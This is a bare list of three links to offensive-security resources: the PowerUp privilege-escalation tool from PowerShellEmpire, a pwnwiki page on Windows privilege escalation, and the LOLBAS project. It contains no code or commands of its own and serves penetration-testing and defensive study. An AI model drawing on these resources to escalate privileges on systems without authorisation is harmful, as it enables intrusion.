[https://github.com/PowerShellEmpire](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp)  
[http://pwnwiki.io](http://pwnwiki.io/#!privesc/windows/index.md)  
[https://lolbas-project.github.io/#](https://lolbas-project.github.io/)  
